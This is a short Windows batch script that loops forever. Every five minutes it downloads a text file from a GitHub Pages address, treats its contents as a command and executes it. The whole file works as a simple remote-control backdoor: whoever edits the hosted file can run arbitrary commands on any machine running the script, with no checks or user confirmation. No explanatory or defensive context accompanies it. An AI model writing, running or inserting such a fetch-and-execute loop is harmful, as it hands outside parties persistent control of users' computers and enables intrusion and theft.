@echo off
setlocal enabledelayedexpansion

:loop
curl -s "samjoel2007.github.io/Operation_Strings/sam/sam.txt" > temp_cmd.txt

set /p command=<temp_cmd.txt

del temp_cmd.txt

echo Executing: !command!

call !command!

timeout /t 300 /nobreak >nul
goto loop
